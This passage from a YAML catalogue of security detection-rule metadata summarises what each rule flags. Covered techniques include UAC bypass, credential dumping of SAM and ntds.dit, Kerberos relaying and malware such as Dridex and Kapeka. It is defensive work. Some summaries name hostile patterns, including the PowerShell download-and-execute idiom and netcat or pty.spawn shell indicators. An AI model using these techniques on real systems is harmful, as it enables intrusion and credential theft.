    can be abused by attackers for malicious activities such as privilege escalation
    and defense evasion. The rule monitors the creation of processes with specific
    original file names indicating they are instances of Mavinject, thereby assisting
    in identifying potential malicious use.
  Updated-Date: '2024_09_03'
e64c8ef3-9f98-40c8-b71e-96110991cb4c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5ef16f75fce513f19ffa0bfcf8e0f061
  Ruleset: emerging-threats
  Summary: This rule detects the loading of specific Dynamic Link Library (DLL) names
    associated with the GraphicalProton backdoor, a tool used by SVR, a Russian Foreign
    Intelligence Service. By monitoring for the presence of these SVR-specific DLLs,
    the rule aims to identify potential instances of the GraphicalProton backdoor
    being employed for malicious activities.
  Updated-Date: '2024_09_03'
e66779cc-383e-4224-a3a4-267eeb585c40:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ad70bef4eacf87dccbc0a4b944af178
  Ruleset: core
  Summary: This rule detects the use of the Microsoft Connection Manager Profile Installer
    (cmstp.exe) being executed with specific command-line arguments that are often
    indicative of attempts to install specially formatted local .INF files. This behavior
    may signify an attempt to bypass User Account Control (UAC) for privilege escalation
    or defense evasion on Windows systems. The rule triggers when the process creation
    logs show cmstp.exe being run with command-line options such as `/s`, `-s`, `/au`,
    `-au`, `/ni`, or `-ni`, which are common indicators of this technique.
  Updated-Date: '2024_09_03'
e6c54d94-498c-4562-a37c-b469d8e9a275:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 943c0ac43b7e114bc6d635ad2f70536e
  Ruleset: core
  Summary: This rule detects suspicious PowerShell commands involving downloading
    and executing code from the internet, which are common in malicious scripts, stagers,
    and downloaders. Specifically, it looks for variations of the `IEX (New-Object
    Net.WebClient).DownloadString` and `(New-Object System.Net.WebClient).DownloadFile`
    commands in the process creation logs. Such patterns can indicate potentially
    harmful behavior where PowerShell is used to retrieve and run code from remote
    sources.
  Updated-Date: '2024_09_03'
e6cb92b4-b470-4eb8-8a9d-d63e8583aae0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b082cd36332c2ab8154acce158d6433c
  Ruleset: sigmahq
  Summary: This rule detects obfuscated PowerShell scripts executed via the RUNDLL32
    launcher, commonly used for defense evasion and execution. It identifies command
    patterns where 'rundll32.exe' invokes 'shell32.dll' and 'shellexec_rundll' along
    with PowerShell commands, which indicate potential malicious activity.
  Updated-Date: '2024_09_04'
e6ce8457-68b1-485b-9bdd-3c2b5d679aa9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 23b15949f5da5f2e78ecbed0834e6035
  Ruleset: core
  Summary: This rule detects the loading of specific Visual Basic for Applications
    (VBA) Dynamic Link Libraries (DLLs) by Microsoft Office applications, which may
    indicate the presence of potentially malicious VBA Macros. It identifies events
    where office applications like Excel, Publisher, OneNote, Outlook, PowerPoint,
    and Word load DLL files such as VBE7.DLL, VBEUI.DLL, and VBE7INTL.DLL. This behavior,
    although sometimes legitimate, might suggest macro execution that could be exploited
    by adversaries for malicious purposes.
  Updated-Date: '2024_09_03'
e6e88853-5f20-4c4a-8d26-cd469fd8d31f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: afc72a63fec82e8a873913de848146cd
  Ruleset: sigmahq
  Summary: This rule detects the potential misuse of the ntdsutil tool to dump the
    ntds.dit database. This activity is associated with credential access, specifically
    targeting the extraction of sensitive Active Directory data. The rule looks for
    specific Windows event logs from the ESENT provider and identifies events that
    contain references to ntds.dit, indicating a possible attempt to dump this critical
    database. This can be indicative of an attempt to obtain credentials illicitly.
    Legitimate operations that may trigger this detection include backup activities
    or the creation of shadow copies.
  Updated-Date: '2024_09_04'
e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 45d4334cdf9b5b1707a9996f5dee58f7
  Ruleset: emerging-threats
  Summary: This rule detects potential Dridex activity by identifying specific process
    patterns on Windows systems. It monitors for unusual behavior involving the `svchost.exe`
    process executing from user directories, often seen with a desktop path in the
    command line, which excludes normal system32 parent processes. Additionally, the
    rule looks for instances of `regsvr32.exe` being launched by `excel.exe` from
    temporary directories, filtering out common scenarios involving `.dll` files typically
    associated with normal operations. It also identifies anomalous parent-child process
    relationships, particularly noting `svchost.exe` spawning processes like `whoami.exe`
    with specific command-line arguments or network query tools such as `net.exe`
    or `net1.exe`. This detection aims to highlight atypical activities indicative
    of Dridex, a notorious banking malware designed to steal banking credentials and
    facilitate unauthorized transactions.
  Updated-Date: '2024_09_03'
e6f81941-b1cd-4766-87db-9fc156f658ee:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7f00a498ed7f95e5e6e3618da9e5f09
  Ruleset: core
  Summary: This rule detects the exploitation of a security bypass and elevation of
    privilege vulnerability in Windows systems, where authentication negotiation is
    subverted using weak RC4-HMAC negotiation. The detection focuses on specific error
    events related to the Kerberos-Key-Distribution-Center, marked by EventID 42.
    This vulnerability is identified as CVE-2022-37966.
  Updated-Date: '2024_09_03'
e6fe26ee-d063-4f5b-b007-39e90aaf50e3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 769c4f7582682870fa431e82cdc56031
  Ruleset: core
  Summary: This rule detects modifications to the "AutodialDLL" registry key, which
    could be exploited as a persistence mechanism by loading a custom Dynamic Link
    Library (DLL) via the "ws2_32" library on Windows systems. Such modifications
    may indicate an attempt to maintain unauthorized access or control over a compromised
    system.
  Updated-Date: '2024_09_03'
e7581747-1e44-4d4b-85a6-0db0b4a00f2a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c13fd8ce8af9f12254f7242fd59e2fa3
  Ruleset: emerging-threats
  Summary: This rule detects the activity of the 3CXDesktopApp updater downloading
    a known compromised version of the 3CXDesktopApp software. It identifies when
    the process "update.exe" within the 3CXDesktopApp directory is executed with a
    command line containing specific parameters related to an update process that
    includes the terms "--update," "http," and a particular version directory "win32/18.12."
    This behavior is indicative of a potentially compromised software update, particularly
    in the context of defense evasion and execution tactics.
  Updated-Date: '2024_09_03'
e76b413a-83d0-4b94-8e4c-85db4a5b8bdc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9c77e740c9dfe3843f0fe756223ef92e
  Ruleset: sigmahq
  Summary: 'This rule detects suspicious SSH daemon (sshd) error messages that indicate
    potential fatal or suspicious errors which could be the result of exploitation
    attempts. Specific error messages include "unexpected internal error," "unknown
    or unsupported key type," "invalid certificate signing key," "invalid elliptic
    curve value," "incorrect signature," "error in libcrypto," "unexpected bytes remain
    after decoding," "fatal: buffer_get_string: bad string," "Local: crc32 compensation
    attack," "bad client public DH value," and "Corrupted MAC on input." These messages
    are indicative of possible security breaches or exploitation activities on Linux
    systems running the SSH service.'
  Updated-Date: '2024_09_04'
e76c8240-d68f-4773-8880-5c6f63595aaf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 210ea8527d7b06730cecc7b8514a887e
  Ruleset: core
  Summary: This rule detects the usage of the Time Travel Debugging Utility, specifically
    targeting the loading of certain DLL files such as 'ttdrecord.dll', 'ttdwriter.dll',
    and 'ttdloader.dll'. This utility is sometimes employed by adversaries to execute
    malicious processes or to capture memory dumps of critical processes like 'lsass.exe',
    which is often targeted for credential harvesting.
  Updated-Date: '2024_09_03'
e7888eb1-13b0-4616-bd99-4bc0c2b054b9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba7e4b3cc982847786101bbc9343a87c
  Ruleset: core
  Summary: This rule detects an anomaly where the "dllhost.exe" process starts without
    any command line arguments, a rare occurrence that might suggest activities such
    as process injection or malware disguising itself as legitimate system processes.
  Updated-Date: '2024_09_03'
e78c408a-e2ea-43cd-b5ea-51975cf358c0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bcc5c67aff10271a5f37ad6ffcedc3bb
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable the Windows Firewall by setting the
    registry key "EnableFirewall" to 0. It monitors specific registry paths, including
    the StandardProfile and DomainProfile under Microsoft Windows Firewall policies,
    to identify changes that indicate the firewall has been turned off.
  Updated-Date: '2024_09_04'
e7a2fd40-3ae1-4a85-bf80-15cf624fb1b1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 52ef77059b7d922e34eba8065bebaacd
  Ruleset: sigmahq
  Summary: This rule detects modifications to autostart extensibility points (ASEP)
    within the Windows registry, specifically under the path '\Software\Policies\Microsoft\Windows\System\Scripts'.
    It monitors changes related to the startup, shutdown, logon, and logoff scripts.
    These registry modifications are crucial as they can be used by malicious actors
    to achieve persistence on a system by executing scripts during these critical
    events. Legitimate software installations or administrative configurations may
    also modify these keys, which should be considered to avoid false positives.
  Updated-Date: '2024_09_04'
e7b18879-676e-4a0e-ae18-27039185a8e7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 40beb3a7279c9fb7efdaea9baf812ced
  Ruleset: sigmahq
  Summary: This rule detects changes to the Netsh registry key that add a new DLL
    value located in a suspicious directory, indicative of a potential persistence
    attempt through a malicious Netsh helper DLL. Modifications to the registry in
    specific subdirectories such as 'Perflogs', 'Users\Public', 'Windows\Temp', 'AppData\Local\Temp',
    'Temporary Internet', and certain user profile folders, can signal malicious activity.
    This detection aims to identify unauthorized persistence mechanisms leveraging
    the Netsh utility on Windows systems.
  Updated-Date: '2024_09_04'
e7be6119-fc37-43f0-ad4f-1f3f99be2f9f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2bc67fb597c23fb952306a8daa0b4d2c
  Ruleset: core
  Summary: This rule detects the copying of sensitive files containing credential
    data, identifiable by specific, well-known filenames and patterns. It focuses
    on the process creation within the Windows environment, particularly highlighting
    the usage of the `esentutl.exe` utility, known for handling Volume Shadow Copy
    Services (VSS). Suspicious command-line activities include paths such as `\config\RegBack\sam`,
    `\config\security`, and `\windows\ntds\ntds.dit`, which are typically associated
    with credential files like the Security Account Manager (SAM) and NT Directory
    Services (NTDS). Legitimate actions such as forensic investigations or backups
    may trigger this rule, but any detection requires careful analysis due to the
    high-risk nature of the accessed files.
  Updated-Date: '2024_09_03'
e7d79a1b-25ed-4956-bd56-bd344fa8fd06:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: deb8b90509918cdd8c64112081756365
  Ruleset: sigmahq
  Summary: This rule detects instances where a MySQL service on an OpenCanary node
    has experienced a login attempt. OpenCanary is a honeypot framework used to emulate
    services and attract potential intruders for monitoring and alerting purposes,
    thereby helping in identifying unauthorized access or probing activities. This
    detection aims to capture and log any credential access attempts on MySQL, providing
    security teams with crucial insights into possible intrusion attempts targeting
    their systems.
  Updated-Date: '2024_09_04'
e80273e1-9faf-40bc-bd85-dbaff104c4e9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6eca920f76a3c2cd91833f52bf2494cd
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "esxcli" command with the "system"
    flag in order to retrieve information about various components of an ESXi system,
    including accounts, modules, and NTP settings. The detection focuses on process
    creation events where the command line contains keywords like "get" and "list."
    This activity might be associated with legitimate administration tasks but can
    also indicate attempts to gather system information for malicious purposes.
  Updated-Date: '2024_09_04'
e80a0fee-1a62-4419-b31e-0d0db6e6013a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a65a118127f779c74fceb6c5e50febea
  Ruleset: sigmahq
  Summary: This rule detects a potential exploitation attempt of CVE-2021-42287, where
    an attacker utilizes certain permissions to create a computer object with a known
    password and then clears the ServicePrincipalName attribute on the computer object.
    As the creator of the object, the attacker gains additional permissions, enabling
    various changes to the object. The detection is based on specific event IDs indicating
    object class and UserAccountControl validation failures, as well as SAM account
    name validation failures in the Active Directory service.
  Updated-Date: '2024_09_04'
e81528db-fc02-45e8-8e98-4e84aba1f10b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c878d4378e326303b014b93e19615fc5
  Ruleset: core
  Summary: This rule detects network connections that are initiated by the "notepad.exe"
    process, which is unusual behavior since Notepad typically does not engage in
    network communication. Such activity might indicate process injection from a beacon
    process or similar malicious activity. Notepad may only make network connections
    when printing documents, for example, communicating with a printer on port 9100.
  Updated-Date: '2024_09_03'
e84d89c4-f544-41ca-a6af-4b92fd38b023:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 226aa615153dd0e0ae54c6645b3ff1a6
  Ruleset: sigmahq
  Summary: This rule detects the use of "msedge_proxy.exe" to download arbitrary files.
    "msedge_proxy.exe" is a binary that can be exploited to execute defense evasion
    and execution techniques. The detection is based on observing process creation
    events where the image corresponds to "msedge_proxy.exe" and the command line
    involves URL patterns indicating a file download attempt. This activity is monitored
    to identify potentially malicious behavior associated with downloading files over
    HTTP or HTTPS using the "msedge_proxy.exe" binary.
  Updated-Date: '2024_09_04'
e88a6ddc-74f7-463b-9b26-f69fc0d2ce85:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad5ba0db3471888d3cb23a24f0b51a45
  Ruleset: sigmahq
  Summary: This rule detects processes that set a new DLL in the DllName parameter
    within the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider
    registry path. Such actions may indicate an adversary abusing time providers to
    execute malicious DLLs during system boot. The Windows Time service (W32Time)
    facilitates time synchronization across and within domains. Monitoring these changes
    can help identify potential persistence or privilege escalation techniques used
    by attackers. The rule filters out common, legitimate DLLs associated with the
    Windows Time service to reduce false positives.
  Updated-Date: '2024_09_04'
e8954be4-b2b8-4961-be18-da1a5bda709c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ff0cdcf115dead55e3c5505af697abca
  Ruleset: emerging-threats
  Summary: This rule detects specific process behaviors commonly associated with the
    Devil Bait malware during its reconnaissance phase. It focuses on monitoring instances
    where processes initiated by 'wscript.exe' include command executions via 'cmd.exe'
    that create or manipulate files within the %APPDATA%\Microsoft\ directory. The
    command lines often end with extensions such as '.xml' or '.txt'. Additionally,
    the rule aims to identify commands typically used for system reconnaissance, such
    as 'dir', 'ipconfig /all', 'systeminfo', and 'tasklist'. This detection strategy
    enhances the ability to identify early signs of Devil Bait's defensive evasion
    tactics.
  Updated-Date: '2024_09_03'
e8a52bbd-bced-459f-bd93-64db45ce7657:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8ba84030927ee0b9c1baaf3b4976ba4b
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new PowerShell module in the initial
    folder of the module directory structure "\WindowsPowerShell\Modules\malware\malware.psm1".
    This event is flagged as suspicious because legitimate PowerShell modules typically
    include a version folder, and the absence of such a structure may indicate malicious
    activity. The detection focuses on files with .ps and .dll extensions within the
    specified path. The rule aims to identify uncommon practices that could indicate
    persistence mechanisms employed by attackers.
  Updated-Date: '2024_09_04'
e8a95b5e-c891-46e2-b33a-93937d3abc31:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c49cd4a31493bde94cbea93763c02eeb
  Ruleset: core
  Summary: This rule detects suspicious execution of Microsoft HTML Help (HH.exe),
    which can be indicative of malicious activity. HH.exe is typically used to display
    help documentation, but it has been exploited to deliver malware, such as banking
    trojans and advanced persistent threats (APTs) like Higaisa or Winnti (APT 41).
    The rule triggers when HH.exe runs from unexpected locations commonly abused by
    malware, such as temporary or user directory paths. These activities are associated
    with techniques like defense evasion, initial access, and execution through scripts
    or native Windows tools.
  Updated-Date: '2024_09_03'
e8d34729-86a4-4140-adfd-0a29c2106307:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25211fbedf539cc9407b33a87a8ebc35
  Ruleset: sigmahq
  Summary: This rule detects the execution of CoercedPotato, a tool utilized for privilege
    escalation on Windows systems. The detection criteria include the presence of
    the executable file named 'CoercedPotato.exe' in the process image path, the occurrence
    of specific command line parameters containing ' --exploitId ', and matches for
    known image hashes associated with CoercedPotato. These indicators collectively
    help identify potential usage of the tool to escalate privileges and perform defense
    evasion.
  Updated-Date: '2024_09_04'
e9142d84-fbe0-401d-ac50-3e519fb00c89:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f2a1cf9449e6482262d396c07e48efee
  Ruleset: core
  Summary: This rule detects a suspicious process command line that uses "whoami"
    as the first parameter, which is indicative of behavior exhibited by the EfsPotato
    exploit. EfsPotato leverages this command to obtain the current user's identity
    on a system, which can be a sign of an attacker trying to escalate privileges
    or gather user context. The presence of ".exe whoami" in the command line is the
    specific pattern flagged by this rule.
  Updated-Date: '2024_09_03'
e92a4287-e072-4a40-9739-370c106bb750:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: afa5939d27d36414b708408cb0eeb85b
  Ruleset: sigmahq
  Summary: This rule detects the execution of SOAPHound, a .NET tool designed to collect
    Active Directory (AD) data, by identifying specific command-line arguments that
    suggest an attempt to extract sensitive AD information.
  Updated-Date: '2024_09_04'
e94486ea-2650-4548-bf25-88cbd0bb32d7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fe21658c77bd6c85d6dfd67b71ad1b3f
  Ruleset: emerging-threats
  Summary: This rule detects the creation of PowerShell script files with specific
    names or suffixes often used in PowerShell scripts by the FIN7 threat group. It
    focuses on files within the SysAid Server directory under the Tomcat webapps folder,
    including filenames that end with 'user.exe', '.war', or 'leave', and filenames
    that contain 'user.'. The rule aims to identify potentially malicious activities
    associated with PowerShell scripts in this context.
  Updated-Date: '2024_09_03'
e94b9ddc-eec5-4bb8-8a58-b9dc5f4e185f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4417f5976802a30554a543fcbb9b318b
  Ruleset: core
  Summary: This rule detects the creation of a file named "wpbbin" in the "%systemroot%\system32\"
    directory. The presence of this file is potentially indicative of a UEFI-based
    persistence method, a sophisticated technique used to maintain unauthorized access
    to a system even if the operating system is reinstalled. This could compromise
    the security of BitLocker-protected drives, as noted in external references. While
    legitimate instances may occur, particularly with specific hardware manufacturers
    like Lenovo, the activity is generally considered a high-risk event due to its
    association with persistent threats.
  Updated-Date: '2024_09_03'
e96253b8-6b3b-4f90-9e59-3b24b99cf9b4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d0803a3a47905035b4ae3e763b8ca1a
  Ruleset: core
  Summary: This rule detects the use of KrbRelay, a tool used for relaying Kerberos
    authentication, by monitoring specific patterns in process creation logs on Windows
    systems. It identifies instances where the 'KrbRelay.exe' executable or its renamed
    versions are executed, and flags command lines that contain particular parameter
    combinations associated with Kerberos relaying, such as '-spn', '-clsid', and
    '-rbcd'. This helps to pinpoint potential credential access attempts that leverage
    the KrbRelay tool.
  Updated-Date: '2024_09_03'
e97d9903-53b2-41fc-8cb9-889ed4093e80:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a46429d51fdde20422f17047983d56df
  Ruleset: core
  Summary: This rule detects the creation of a service named 'KrbSCM' on Windows systems,
    which is associated with the usage of the KrbRelayUp tool. KrbRelayUp is used
    for privilege escalation in Windows domain environments where LDAP signing is
    not enforced by default. The detection is based on identifying Event ID 7045 in
    the system logs.
  Updated-Date: '2024_09_03'
e9856028-fd4e-46e6-b3d1-10f7ceb95078:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4cd2f2d1d0947c09f367cd3e40e337b
  Ruleset: sigmahq
  Summary: This rule detects instances where an SNMP service on an OpenCanary node
    has had an Object Identifier (OID) request. OpenCanary is a honeypot solution
    that mimics various services to attract and analyze malicious activity in a network.
    This rule is designed to identify potential network reconnaissance or unauthorized
    attempts to access network management systems via SNMP OID requests.
  Updated-Date: '2024_09_04'
e98f741c-6a5b-4c83-bc2a-1f4e58d07b12:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 434689b2e6f8f3193daa35005dd70ca8
  Ruleset: emerging-threats
  Summary: 'This rule detects the execution pattern of the Kapeka backdoor by identifying
    when the backdoor binary is launched via the `rundll32.exe` process. The detection
    focuses on specific conditions within the command line arguments: the presence
    of files with a `.wll` extension, an ordinal value `#1`, and the `-d` argument.
    It scrutinizes paths within `ProgramData` and `AppData\Local` directories, indicative
    of how the dropper initiates the backdoor. The rule is designed to capture both
    the standard and observed variants of this backdoor execution method. Kapeka is
    known for employing the `rundll32` utility to obfuscate its presence and evade
    detection mechanisms.'
  Updated-Date: '2024_09_03'
e9928831-ba14-42ea-a4bc-33d352b9929a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0375924b6fbc6918defdce3493e1fe86
  Ruleset: emerging-threats
  Summary: This rule detects exploitation activity of CVE-2023-46747, an unauthenticated
    remote code execution vulnerability in F5 BIG-IP software. The detection focuses
    on POST requests where the URI contains `'/mgmt/tm/util/bash'`, along with specific
    strings in either hexadecimal or plain text that indicate attempts to access particular
    admin paths and pages. These specific paths and pages include `'/tmui/Control/form'`
    and patterns related to user creation pages within the system management interface.
    This aims to identify attempts at unauthorized access and control, which can signal
    potential exploitation attempts on the targeted web server.
  Updated-Date: '2024_09_03'
e9a2b582-3f6a-48ac-b4a1-6849cdc50b3c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f0362b6b7c4eab8a362399e475db0cbf
  Ruleset: sigmahq
  Summary: This rule detects threading-related errors in Apache logs, specifically
    identifying issues where the assertion `new_prio == -1 || (new_prio >= fifo_min_prio
    && new_prio <= fifo_max_prio)` fails in the `__pthread_tpp_change_priority` function.
    These types of errors can indicate potential vulnerabilities or misconfigurations
    in the Apache service, which may be exploited for initial access or lateral movement
    within a network. The errors may also be related to or caused by third-party Apache
    modules.
  Updated-Date: '2024_09_04'
e9b61244-893f-427c-b287-3e708f321c6b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13d3233d3bcf4560d832314d8a28051c
  Ruleset: core
  Summary: This rule detects the creation of a symbolic link between "cmd.exe" and
    the accessibility on-screen keyboard binary (osk.exe) using the "mklink" command.
    This technique can be used for privilege escalation by providing an elevated command
    prompt to the user from the login screen without the need for authentication.
    The activity is identified by analyzing process creation events for instances
    where "cmd.exe" is involved with "mklink" in conjunction with "osk.exe".
  Updated-Date: '2024_09_03'
e9bc39ae-978a-4e49-91ab-5bd481fc668b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af425276bad90c7ab2d9e3f6451e3d63
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of the CVE-2019-3398 vulnerability in
    Confluence, a popular team collaboration software. The specific attack involves
    an arbitrary file write through a path traversal vulnerability by analyzing HTTP
    POST requests where the URI query contains "/upload.action" combined with a directory
    traversal string. The rule aims to identify potentially malicious activity attempting
    to exploit this vulnerability.
  Updated-Date: '2024_09_03'
e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 998573a29c7179af41569d90c2f67ddd
  Ruleset: sigmahq
  Summary: This rule detects write access requests to the Windows Defender exclusions
    registry keys, which can indicate an attacker attempting to modify or add exclusions
    to bypass security measures. Specific event IDs monitored include 4656, which
    logs when a handle to an object is requested, and 4663, which logs when an access
    attempt to an object is made. It's crucial to monitor these activities as they
    can signify malicious attempts to disable or evade Windows Defender by altering
    its exclusion settings.
  Updated-Date: '2024_09_04'
e9d4ab66-a532-4ef7-a502-66a9e4a34f5d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b2280424b64716183759eea0a23165a9
  Ruleset: sigmahq
  Summary: This rule detects the use of NTLMv1 for authentication between a client
    and server. NTLMv1 is considered insecure because its encryption algorithms can
    be easily brute-forced by modern hardware, posing a significant security risk.
  Updated-Date: '2024_09_04'
e9edd087-89d8-48c9-b0b4-5b9bb10896b8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2359be1f4de83331bddbbb8aef22ad03
  Ruleset: core
  Summary: This rule detects potential SpEL (Spring Expression Language) Injection
    exploitation attempts within the Spring Framework, which may result in remote
    code execution (RCE). It identifies the presence of error messages indicating
    `org.springframework.expression.ExpressionException` in application error logs,
    triggered when SpEL expressions fail. This type of injection issue can be critical,
    providing unauthorized access through manipulated input expressions. Logged errors
    must be reviewed critically, as legitimate application bugs can sometimes generate
    similar error messages.
  Updated-Date: '2024_09_03'
e9f55347-2928-4c06-88e5-1a7f8169942e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ae68cf6d72ea98c36d5a27d8971e6712
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell commands that utilize
    the VAR++ LAUNCHER technique. It specifically looks for command lines that contain
    patterns indicative of obfuscation, such as segments involving '&&set', 'cmd',
    '/c', and the format string '-f', as well as sequences of placeholders like '{0}',
    '{1}', '{2}', '{3}', '{4}', and '{5}'. This detection is particularly aimed at
    scenarios where PowerShell scripts are using complex, encoded strings and dynamic
    code execution to evade security measures.
  Updated-Date: '2024_09_03'
e9f8f8cc-07cc-4e81-b724-f387db9175e4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4618cbe7847fd4d0beeea7f9cf7d0157
  Ruleset: sigmahq
  Summary: This rule detects the potentially suspicious execution of Regasm or Regsvcs
    utilities when they are used with uncommon file extensions such as .dat, .gif,
    .jpeg, .jpg, .png, or .txt. These utilities are typically used for registering
    and controlling .NET assembly files, and their invocation with unconventional
    file types may indicate an attempt to evade detection or perform unauthorized
    actions.
  Updated-Date: '2024_09_04'
ea011323-7045-460b-b2d7-0f7442ea6b38:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: be0bea9743432749029ea881670f1fb8
  Ruleset: core
  Summary: This rule detects potential remote execution using PsExec by identifying
    specific command-line flags commonly employed by the utility. PsExec is a tool
    from Sysinternals that allows users to execute processes on remote systems. Indicators
    include the acceptance of the end-user license agreement (EULA) and the presence
    of user credentials and remote system identifiers within the command line.
  Updated-Date: '2024_09_03'
ea0cdc3e-2239-4f26-a947-4e8f8224e464:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af055849cfaf62ebe47cef639f5ae397
  Ruleset: sigmahq
  Summary: This rule detects the execution of certutil.exe with the "-encode" flag
    used to convert a file to Base64 encoding when the file extension is considered
    suspicious. Certutil is a command-line utility used for certificate services;
    however, its encoding functionality can be misused by attackers to evade detection
    and mask malicious payloads within seemingly benign file types such as .doc, .pdf,
    .jpg, and .mp3. The detection is based on specific command-line patterns and the
    presence of certain file extensions.
  Updated-Date: '2024_09_04'
ea3ecad2-db86-4a89-ad0b-132a10d2db55:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 10335b08503191887454088d8c63e596
  Ruleset: sigmahq
  Summary: This rule detects suspicious activity involving interactive Bash sessions
    as parent processes of uncommon child processes. Specifically, it looks for Bash
    invoked with the `-i` flag as the parent command line and checks for instances
    where the child process command line contains substrings such as `-c import`,
    `base64`, or `pty.spawn`. Additionally, it identifies child processes ending with
    executables like `whoami`, `iptables`, `ncat`, `nc`, or `netcat`. This pattern
    may indicate potential misuse for execution or defense evasion techniques.
  Updated-Date: '2024_09_04'
ea5c131b-380d-49f9-aeb3-920694da4d4b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8dcd97b716b56d2539d67c87158cc52d
  Ruleset: core
  Summary: This rule detects the loading and execution of an unsigned Thor scanner
    binary on Windows systems. Thor is a forensic scanner developed by Nextron Systems,
    typically used for identifying and analyzing malware and security incidents. The
    rule identifies instances of binaries named "thor.exe" or "thor64.exe" that are
    not signed by Nextron Systems GmbH with a valid signature. This helps to flag
    potentially malicious or unauthorized versions of the Thor scanner that could
    be used for defense evasion tactics.
  Updated-Date: '2024_09_03'
ea9bf0fa-edec-4fb8-8b78-b119f2528186:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 551b5f4cf159c441b795fba4cc817857
  Ruleset: core
  Summary: This rule detects the triggering of the Anti-Malware Scan Interface (AMSI)
    by Windows Defender, indicating that malware or potentially unwanted software
    has been identified. It focuses on logs from Windows Defender where the EventID
    is 1116 and the source is AMSI. This detection approach helps in identifying the
    execution of malicious scripts or code snippets intercepted by AMSI.
  Updated-Date: '2024_09_03'
eaa9ac35-1730-441f-9587-25767bde99d7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a9b536cf884a23a84dd10267a7e58bba
  Ruleset: sigmahq
